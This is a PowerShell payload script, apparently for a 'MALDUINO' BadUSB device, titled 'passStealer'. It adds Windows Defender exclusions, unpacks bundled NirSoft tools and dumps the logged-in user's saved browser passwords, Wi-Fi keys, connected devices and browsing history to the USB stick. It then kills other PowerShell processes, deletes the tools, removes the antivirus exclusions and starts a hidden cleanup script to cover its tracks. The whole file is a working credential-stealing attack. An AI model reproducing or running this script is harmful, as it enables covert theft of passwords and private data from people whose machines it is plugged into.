#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                
$u=Get-WmiObject Win32_Volume|Where-Object{$_.Label -eq'MALDUINO'}|Select-Object name;Set-Location $u.name #Go to the folder in which we will download files
Set-Location passStealer #Go to passStealer directory
Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
Add-MpPreference -ExclusionPath /dump
#Expand zip protected archive in dump directory
$7ZipPath = "\passStealer\7z\x64\7za.exe"
$zipFile = "tools.zip"
$zipFilePassword = "tools"
$destinationUnzipPath = "/dump"
$command = "& $7ZipPath e -o$destinationUnzipPath -y -tzip -p$zipFilePassword $zipFile"
Invoke-Expression $command
Set-Location /dump #Go to dump directory
.\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_passwords.txt #Create the file for Browser passwords
.\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_wifi.txt #Create the file for WiFi passwords
.\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_connected_devices.txt #Create the file for connected devices
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_history.txt #Create the file for Browser history
Start-Sleep -Seconds 60 #Wait 5 seconds
Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
Start-Sleep -Seconds 10 #Wait 10 seconds
#Delete nirsoft tools and .ps1 file
Remove-Item WirelessKeyView.exe
Remove-Item WebBrowserPassView.exe
Remove-Item tools
#Enable and disable capslock to know when you can eject BadUSB
$keyBoardObject = New-Object -ComObject WScript.Shell
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Remove-MpPreference -ExclusionPath /dump
Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
Set-Location /passStealer
powershell.exe -noexit -windowstyle hidden -file fin.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
exit #End .ps1 file
